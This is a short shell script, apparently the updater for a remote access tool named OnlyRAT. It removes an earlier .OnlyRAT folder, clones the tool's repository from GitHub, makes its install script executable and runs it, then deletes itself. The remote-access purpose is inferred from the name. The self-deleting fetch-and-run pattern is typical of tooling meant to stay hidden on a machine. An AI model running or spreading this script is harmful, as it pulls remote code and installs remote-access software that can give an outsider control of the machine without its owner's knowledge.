# remove previous version
rm -rf .OnlyRAT

# install new version
git clone https://github.com/CosmodiumCS/OnlyRAT.git

# install dependencies
cd OnlyRAT
chmod +x install.sh
./install.sh

# self delete
rm -rf ../update.sh
